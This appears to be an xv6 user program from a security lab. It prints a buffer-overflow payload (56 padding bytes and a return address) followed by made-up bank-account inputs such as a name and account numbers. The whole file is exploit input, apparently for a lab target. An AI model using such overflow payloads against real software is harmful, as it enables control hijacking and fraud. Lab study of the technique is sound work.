#include "kernel/types.h"
#include "user/user.h"
int
main(void)
{
        write(1,"AAAAAAAA",8);
        write(1,"AAAAAAAA",8);
        write(1,"AAAAAAAA",8);
        write(1,"AAAAAAAA",8);
        write(1,"AAAAAAAA",8);
        write(1,"AAAAAAAA",8);
        write(1,"AAAAAAAA",8);
        write(1,"\x52\x00\x00\x00\x00\x00\x00\x00",8);
        write(1,"\n",1);
    // Account information
        write(1,"100\n",4);
        write (1,"John Smith\n",11);
        write(1,"123456\n",7);
        write(1,"87654321\n",9);
        write(1,"Y/n",2);

         exit(0);
}
